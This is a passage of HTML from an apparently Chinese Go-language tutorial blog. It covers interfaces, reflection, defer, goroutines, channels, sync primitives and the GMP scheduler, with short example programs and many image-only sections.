class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> IF <span class="keyword">interface</span> &#123;</span><br><span class="line">    getName() <span class="keyword">string</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Human <span class="keyword">struct</span> &#123;</span><br><span class="line">    firstName, lastName <span class="keyword">string</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Plane <span class="keyword">struct</span> &#123;</span><br><span class="line">    vendor <span class="keyword">string</span></span><br><span class="line">    model  <span class="keyword">string</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(h *Human)</span> <span class="title">getName</span><span class="params">()</span> <span class="title">string</span></span> &#123;</span><br><span class="line">    <span class="keyword">return</span> h.firstName + <span class="string">&quot;,&quot;</span> + h.lastName</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//不加*也是可以运行的</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(p Plane)</span> <span class="title">getName</span><span class="params">()</span> <span class="title">string</span></span> &#123;</span><br><span class="line">    <span class="keyword">return</span> fmt.Sprintf(<span class="string">&quot;vendor: %s, model: %s&quot;</span>, p.vendor, p.model)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Car <span class="keyword">struct</span> &#123;</span><br><span class="line">    factory, model <span class="keyword">string</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(c *Car)</span> <span class="title">getName</span><span class="params">()</span> <span class="title">string</span></span> &#123;</span><br><span class="line">    <span class="keyword">return</span> c.factory + <span class="string">&quot;-&quot;</span> + c.model</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    interfaces := []IF&#123;&#125;</span><br><span class="line">    h := <span class="built_in">new</span>(Human)</span><br><span class="line">    h.firstName = <span class="string">&quot;first&quot;</span></span><br><span class="line">    h.lastName = <span class="string">&quot;last&quot;</span></span><br><span class="line">    interfaces = <span class="built_in">append</span>(interfaces, h)</span><br><span class="line">    c := <span class="built_in">new</span>(Car)</span><br><span class="line">    c.factory = <span class="string">&quot;benz&quot;</span></span><br><span class="line">    c.model = <span class="string">&quot;s&quot;</span></span><br><span class="line">    interfaces = <span class="built_in">append</span>(interfaces, c)</span><br><span class="line">    <span class="keyword">for</span> _, f := <span class="keyword">range</span> interfaces &#123;</span><br><span class="line">        fmt.Println(f.getName())</span><br><span class="line">    &#125;</span><br><span class="line">    p := Plane&#123;&#125;</span><br><span class="line">    p.vendor = <span class="string">&quot;testVendor&quot;</span></span><br><span class="line">    p.model = <span class="string">&quot;testModel&quot;</span></span><br><span class="line">    fmt.Println(p.getName())</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h3><ul><li>Interface 是可能为nil的，所以针对 interface 的使用一定要 预先判空，否则会引起程序 crash(nil panic) </li><li>Struct初始化意味着空间分配，对 struct 的引用不会出现空指针<h2 id="反射机制"><a href="#反射机制" class="headerlink" title="反射机制"></a>反射机制</h2><img src="http://106.12.125.218/medias/medias/Golang%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/50.png"><h3 id="基于-struct-的反射"><a href="#基于-struct-的反射" class="headerlink" title="基于 struct 的反射"></a>基于 struct 的反射</h3><img src="http://106.12.125.218/medias/medias/Golang%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/51.png"></li></ul><h3 id="实例-1"><a href="#实例-1" class="headerlink" title="实例"></a>实例</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="string">&quot;reflect&quot;</span></span><br><span class="line">)</span><br><span class="line">funcmain() &#123;</span><br><span class="line"><span class="comment">// basic type</span></span><br><span class="line">myMap := <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="keyword">string</span>]<span class="keyword">string</span>, <span class="number">10</span>)</span><br><span class="line"> myMap[<span class="string">&quot;a&quot;</span>] = <span class="string">&quot;b&quot;</span></span><br><span class="line">t := reflect.TypeOf(myMap)</span><br><span class="line"> fmt.Println(<span class="string">&quot;type:&quot;</span>, t)</span><br><span class="line">v := reflect.ValueOf(myMap)</span><br><span class="line"> fmt.Println(<span class="string">&quot;value:&quot;</span>, v)</span><br><span class="line"><span class="comment">// struct</span></span><br><span class="line">myStruct := T&#123;A: <span class="string">&quot;a&quot;</span>&#125;</span><br><span class="line">v1 := reflect.ValueOf(myStruct)</span><br><span class="line">fori := <span class="number">0</span>; i &lt; v1.NumField(); i++ &#123;</span><br><span class="line"> fmt.Printf(<span class="string">&quot;Field %d: %v\n&quot;</span>, i, v1.Field(i))</span><br><span class="line"> &#125;</span><br><span class="line">fori := <span class="number">0</span>; i &lt; v1.NumMethod(); i++ &#123;</span><br><span class="line"> fmt.Printf(<span class="string">&quot;Method %d: %v\n&quot;</span>, i, v1.Method(i))</span><br><span class="line"> &#125;</span><br><span class="line"><span class="comment">// 需要注意receive是struct还是指针</span></span><br><span class="line">result := v1.Method(<span class="number">0</span>).Call(<span class="literal">nil</span>)</span><br><span class="line"> fmt.Println(<span class="string">&quot;result:&quot;</span>, result)</span><br><span class="line">&#125;</span><br><span class="line">typeTstruct &#123;</span><br><span class="line"> A <span class="keyword">string</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 需要注意receive是struct还是指针</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(t T)</span> <span class="title">String</span><span class="params">()</span> <span class="title">string</span></span> &#123;</span><br><span class="line"><span class="keyword">return</span> t.A + <span class="string">&quot;1&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Go语言中的面向对象编程"><a href="#Go语言中的面向对象编程" class="headerlink" title="Go语言中的面向对象编程"></a>Go语言中的面向对象编程</h2><p><img src="http://106.12.125.218/medias/medias/Golang%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/52.png"></p><h2 id="Json编解码"><a href="#Json编解码" class="headerlink" title="Json编解码"></a>Json编解码</h2><p><img src="http://106.12.125.218/medias/medias/Golang%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/53.png"><br><img src="http://106.12.125.218/medias/medias/Golang%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/54.png"><br>其中<img src="http://106.12.125.218/medias/medias/Golang%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/55.png">是类型断言<br><img src="http://106.12.125.218/medias/medias/Golang%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/56.png">只能在switch语句中使用</p><h2 id="错误处理"><a href="#错误处理" class="headerlink" title="错误处理"></a>错误处理</h2><p><img src="http://106.12.125.218/medias/medias/Golang%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/57.png"></p><h2 id="defer"><a href="#defer" class="headerlink" title="defer"></a>defer</h2><p><img src="http://106.12.125.218/medias/medias/Golang%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/58.png"><br>defer相当于一个 栈，其他语句执行完了再执行defer栈里的 </p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="string">&quot;sync&quot;</span></span><br><span class="line"><span class="string">&quot;time&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="keyword">defer</span> fmt.Println(<span class="string">&quot;1&quot;</span>)</span><br><span class="line"><span class="keyword">defer</span> fmt.Println(<span class="string">&quot;2&quot;</span>)</span><br><span class="line"><span class="keyword">defer</span> fmt.Println(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">loopFunc()</span><br><span class="line">time.Sleep(time.Second)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">loopFunc</span><span class="params">()</span></span> &#123;</span><br><span class="line">lock := sync.Mutex&#123;&#125;</span><br><span class="line"><span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="number">3</span>; i++ &#123;</span><br><span class="line"><span class="comment">// go func(i int) &#123;</span></span><br><span class="line">lock.Lock()</span><br><span class="line"><span class="keyword">defer</span> lock.Unlock()</span><br><span class="line">fmt.Println(<span class="string">&quot;loopFunc:&quot;</span>, i)</span><br><span class="line"><span class="comment">// &#125;(i)</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//输出：</span></span><br><span class="line"><span class="comment">//loopFuncloopFunc: 0</span></span><br><span class="line"><span class="comment">//fatal error: all goroutines are asleep - deadlock!</span></span><br></pre></td></tr></table></figure><p>加上注释里的就不会死锁了（使用了闭包），此时defer相当于finally，<strong>不管执行过程中发生了什么锁都会被释放掉</strong>。</p><h2 id="Panic-和-recover"><a href="#Panic-和-recover" class="headerlink" title="Panic 和 recover"></a>Panic 和 recover</h2><p>模拟try-catch机制<br><img src="http://106.12.125.218/medias/medias/Golang%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/59.png"></p><h2 id="多线程"><a href="#多线程" class="headerlink" title="多线程"></a>多线程</h2><h3 id="并发和并行"><a href="#并发和并行" class="headerlink" title="并发和并行"></a>并发和并行</h3><p><img src="http://106.12.125.218/medias/medias/Golang%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/60.png"></p><h3 id="协程"><a href="#协程" class="headerlink" title="协程"></a>协程</h3><p><img src="http://106.12.125.218/medias/medias/Golang%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/61.png"></p><h3 id="Communication-Sequential-Process"><a href="#Communication-Sequential-Process" class="headerlink" title="Communication Sequential Process"></a>Communication Sequential Process<img src="http://106.12.125.218/medias/medias/Golang%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/62.png"></h3><h3 id="线程和协程"><a href="#线程和协程" class="headerlink" title="线程和协程"></a>线程和协程</h3><p><img src="http://106.12.125.218/medias/medias/Golang%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/63.png"></p><h3 id="协程示例"><a href="#协程示例" class="headerlink" title="协程示例"></a>协程示例</h3><p><img src="http://106.12.125.218/medias/medias/Golang%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/64.png"><br><img src="http://106.12.125.218/medias/medias/Golang%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/65.png"></p><h3 id="channel-多线程通信"><a href="#channel-多线程通信" class="headerlink" title="channel-多线程通信"></a>channel-多线程通信</h3><p><img src="http://106.12.125.218/medias/medias/Golang%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/66.png"></p><h3 id="通道缓冲"><a href="#通道缓冲" class="headerlink" title="通道缓冲"></a>通道缓冲</h3><p>golang中定义channal是make(chan int,i)<br>后面的数字i就是channal的容量, 这里重点说一下容量为0(默认)和容量为1的区别:<br>可以把channal想象成一个水管<br>容量为0时, 这个水管必须先接好出口,即&lt;-chan, 然后才能往水管里注水, 即chan&lt;-<br>而容量为1时, 水管有了一个蓄水池, 就可以在没接出口时, 先往水管里放1个单位的水,也就是说可以先chan&lt;-, 再&lt;-chan<br>容量默认是0，也就是说：来数据的话，如果不读取的话就会一直堵塞。<br><img src="http://106.12.125.218/medias/medias/Golang%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/67.png"></p><h3 id="遍历通道缓冲区"><a href="#遍历通道缓冲区" class="headerlink" title="遍历通道缓冲区"></a>遍历通道缓冲区</h3><p><img src="http://106.12.125.218/medias/medias/Golang%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/68.png"></p><h3 id="单向通道"><a href="#单向通道" class="headerlink" title="单向通道"></a>单向通道</h3><p>可以避免误操作<br><img src="http://106.12.125.218/medias/medias/Golang%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/69.png"></p><h3 id="关闭通道"><a href="#关闭通道" class="headerlink" title="关闭通道"></a>关闭通道</h3><p><img src="http://106.12.125.218/medias/medias/Golang%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/70.png"></p><h3 id="select"><a href="#select" class="headerlink" title="select"></a>select</h3><p><img src="http://106.12.125.218/medias/medias/Golang%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/71.png"></p><h3 id="Timer"><a href="#Timer" class="headerlink" title="Timer"></a>Timer</h3><p><img src="http://106.12.125.218/medias/medias/Golang%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/72.png"></p><h3 id="上下文Context"><a href="#上下文Context" class="headerlink" title="上下文Context"></a>上下文Context</h3><p><img src="http://106.12.125.218/medias/medias/Golang%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/73.png"></p><h3 id="如何停止一个子协程"><a href="#如何停止一个子协程" class="headerlink" title="如何停止一个子协程"></a>如何停止一个子协程</h3><p><img src="http://106.12.125.218/medias/medias/Golang%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/74.png"></p><h3 id="基于Context停止子协程"><a href="#基于Context停止子协程" class="headerlink" title="基于Context停止子协程"></a>基于Context停止子协程</h3><p><img src="http://106.12.125.218/medias/medias/Golang%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/75.png"></p><h2 id="进阶篇"><a href="#进阶篇" class="headerlink" title="进阶篇"></a>进阶篇</h2><h3 id="线程加锁"><a href="#线程加锁" class="headerlink" title="线程加锁"></a>线程加锁</h3><p><img src="http://106.12.125.218/medias/medias/Golang%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/76.png"></p><h4 id="RWMutex用例"><a href="#RWMutex用例" class="headerlink" title="RWMutex用例"></a>RWMutex用例</h4><p><img src="http://106.12.125.218/medias/medias/Golang%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/77.png"></p><h4 id="如何保证执行完主线程之内的所有线程"><a href="#如何保证执行完主线程之内的所有线程" class="headerlink" title="如何保证执行完主线程之内的所有线程"></a>如何保证执行完主线程之内的所有线程</h4><p>使用WaitGroup</p><h5 id="简单用例"><a href="#简单用例" class="headerlink" title="简单用例"></a>简单用例</h5><p><img src="http://106.12.125.218/medias/medias/Golang%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/78.png"></p><h5 id="Kubernetes中的用例"><a href="#Kubernetes中的用例" class="headerlink" title="Kubernetes中的用例"></a>Kubernetes中的用例</h5><p><img src="http://106.12.125.218/medias/medias/Golang%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/79.png"></p><h4 id="Cond示例"><a href="#Cond示例" class="headerlink" title="Cond示例"></a>Cond示例</h4><p>生产者<br><img src="http://106.12.125.218/medias/medias/Golang%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/80.png"><br>消费者：<br><img src="http://106.12.125.218/medias/medias/Golang%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/81.png"></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//简易生产者消费者模型</span></span><br><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="string">&quot;sync&quot;</span></span><br><span class="line"><span class="string">&quot;time&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Queue <span class="keyword">struct</span> &#123;</span><br><span class="line">queue []<span class="keyword">string</span></span><br><span class="line">cond  *sync.Cond</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">q := Queue&#123;</span><br><span class="line">queue: []<span class="keyword">string</span>&#123;&#125;,</span><br><span class="line">cond:  sync.NewCond(&amp;sync.Mutex&#123;&#125;),</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="keyword">for</span> &#123;</span><br><span class="line">q.Enqueue(<span class="string">&quot;a&quot;</span>)</span><br><span class="line">time.Sleep(time.Second * <span class="number">2</span>)</span><br><span class="line">&#125;</span><br><span class="line">&#125;()</span><br><span class="line"><span class="keyword">for</span> &#123;</span><br><span class="line">q.Dequeue()</span><br><span class="line">time.Sleep(time.Second)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(q *Queue)</span> <span class="title">Enqueue</span><span class="params">(item <span class="keyword">string</span>)</span></span> &#123;</span><br><span class="line">q.cond.L.Lock()</span><br><span class="line"><span class="keyword">defer</span> q.cond.L.Unlock()</span><br><span class="line">q.queue = <span class="built_in">append</span>(q.queue, item)</span><br><span class="line">fmt.Printf(<span class="string">&quot;putting %s to queue, notify all\n&quot;</span>, item)</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//broadcast与wait配合的例子</span></span><br><span class="line">    <span class="comment">//处于wait状态的协程0和1，在收到broadcast之后，都会继续执行后续操作。</span></span><br><span class="line">    <span class="comment">//signal与wait配合的例子</span></span><br><span class="line">    <span class="comment">//第一个signal触发的时候，就算已经有2个协程在wait状态，但是wait状态中的最开始等待的协程0会被先调用。</span></span><br><span class="line"></span><br><span class="line">    q.cond.Broadcast()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(q *Queue)</span> <span class="title">Dequeue</span><span class="params">()</span> <span class="title">string</span></span> &#123;</span><br><span class="line">q.cond.L.Lock()</span><br><span class="line"><span class="keyword">defer</span> q.cond.L.Unlock()</span><br><span class="line"><span class="keyword">for</span> <span class="built_in">len</span>(q.queue) == <span class="number">0</span> &#123;</span><br><span class="line">fmt.Println(<span class="string">&quot;no data available, wait&quot;</span>)</span><br><span class="line">q.cond.Wait()</span><br><span class="line">&#125;</span><br><span class="line">result := q.queue[<span class="number">0</span>]</span><br><span class="line">q.queue = q.queue[<span class="number">1</span>:]</span><br><span class="line"><span class="keyword">return</span> result</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="sync-Once"><a href="#sync-Once" class="headerlink" title="sync.Once"></a>sync.Once</h4><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="string">&quot;sync&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> SliceNum []<span class="keyword">int</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">NewSlice</span><span class="params">()</span> <span class="title">SliceNum</span></span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">make</span>(SliceNum, <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(s *SliceNum)</span> <span class="title">Add</span><span class="params">(elem <span class="keyword">int</span>)</span> *<span class="title">SliceNum</span></span> &#123;</span><br><span class="line">*s = <span class="built_in">append</span>(*s, elem)</span><br><span class="line">fmt.Println(<span class="string">&quot;add&quot;</span>, elem)</span><br><span class="line">fmt.Println(<span class="string">&quot;add SliceNum end&quot;</span>, s)</span><br><span class="line"><span class="keyword">return</span> s</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="keyword">var</span> once sync.Once</span><br><span class="line">s := NewSlice()</span><br><span class="line"><span class="comment">// 看源代码理解once的行为</span></span><br><span class="line">once.Do(<span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">s.Add(<span class="number">16</span>)</span><br><span class="line">&#125;)</span><br><span class="line">once.Do(<span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">s.Add(<span class="number">16</span>)</span><br><span class="line">&#125;)</span><br><span class="line">once.Do(<span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">s.Add(<span class="number">16</span>)</span><br><span class="line">&#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>源码如下：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(o *Once)</span> <span class="title">Do</span><span class="params">(f <span class="keyword">func</span>()</span>)</span> &#123;</span><br><span class="line">    <span class="comment">//这里是一个CallBack</span></span><br><span class="line"><span class="comment">// Note: Here is an incorrect implementation of Do:</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//if atomic.CompareAndSwapUint32(&amp;o.done, 0, 1) &#123;</span></span><br><span class="line"><span class="comment">//f()</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Do guarantees that when it returns, f has finished.</span></span><br><span class="line"><span class="comment">// This implementation would not implement that guarantee:</span></span><br><span class="line"><span class="comment">// given two simultaneous calls, the winner of the cas would</span></span><br><span class="line"><span class="comment">// call f, and the second would return immediately, without</span></span><br><span class="line"><span class="comment">// waiting for the first&#x27;s call to f to complete.</span></span><br><span class="line"><span class="comment">// This is why the slow path falls back to a mutex, and why</span></span><br><span class="line"><span class="comment">// the atomic.StoreUint32 must be delayed until after f returns.</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> atomic.LoadUint32(&amp;o.done) == <span class="number">0</span> &#123;</span><br><span class="line"><span class="comment">// Outlined slow-path to allow inlining of the fast-path.</span></span><br><span class="line">o.doSlow(f)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(o *Once)</span> <span class="title">doSlow</span><span class="params">(f <span class="keyword">func</span>()</span>)</span> &#123;</span><br><span class="line">o.m.Lock()</span><br><span class="line"><span class="keyword">defer</span> o.m.Unlock()</span><br><span class="line"><span class="keyword">if</span> o.done == <span class="number">0</span> &#123;</span><br><span class="line"><span class="keyword">defer</span> atomic.StoreUint32(&amp;o.done, <span class="number">1</span>)</span><br><span class="line">f()</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>综上，有两种方式可以实现线程安全：channel和共享内存，鼓励用channel。</p><h3 id="线程调度"><a href="#线程调度" class="headerlink" title="线程调度"></a>线程调度</h3><p><img src="http://106.12.125.218/medias/medias/Golang%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/82.png"></p><h4 id="Linux进程的内存使用"><a href="#Linux进程的内存使用" class="headerlink" title="Linux进程的内存使用"></a>Linux进程的内存使用</h4><p>虚拟内存：通过内存和磁盘的交换来虚拟出更多的内存：原先的程序有4g虚拟内存，如果内存上一部分资源不活跃就被转到磁盘上，新进来的程序依旧有4g的虚拟内存。<br><img src="http://106.12.125.218/medias/medias/Golang%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/83.png"></p><h4 id="CPU对内存的访问"><a href="#CPU对内存的访问" class="headerlink" title="CPU对内存的访问"></a>CPU对内存的访问</h4><p>TLB也是加速的作用<br><img src="http://106.12.125.218/medias/medias/Golang%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/84.png"></p><h4 id="进程切换开销"><a href="#进程切换开销" class="headerlink" title="进程切换开销"></a>进程切换开销</h4><p><img src="http://106.12.125.218/medias/medias/Golang%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/85.png"></p><h4 id="线程切换开销"><a href="#线程切换开销" class="headerlink" title="线程切换开销"></a>线程切换开销</h4><p><img src="http://106.12.125.218/medias/medias/Golang%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/86.png"></p><h4 id="用户线程"><a href="#用户线程" class="headerlink" title="用户线程"></a>用户线程</h4><p><img src="http://106.12.125.218/medias/medias/Golang%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/87.png"></p><h4 id="Goroutine"><a href="#Goroutine" class="headerlink" title="Goroutine"></a>Goroutine</h4><p><img src="http://106.12.125.218/medias/medias/Golang%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/88.png"></p><h4 id="MPG的对应关系"><a href="#MPG的对应关系" class="headerlink" title="MPG的对应关系"></a>MPG的对应关系</h4><p><img src="http://106.12.125.218/medias/medias/Golang%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/89.png"></p><h4 id="GMP模型细节"><a href="#GMP模型细节" class="headerlink" title="GMP模型细节"></a>GMP模型细节</h4><p><img src="http://106.12.125.218/medias/medias/Golang%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/90.png"></p><h4 id="P的状态"><a href="#P的状态" class="headerlink" title="P的状态"></a>P的状态</h4><p><img src="http://106.12.125.218/medias/medias/Golang%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/91.png"></p><h4 id="G的状态"><a href="#G的状态" class="headerlink" title="G的状态"></a>G的状态</h4><p><img src="http://106.12.125.218/medias/medias/Golang%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/92.png"></p><h4 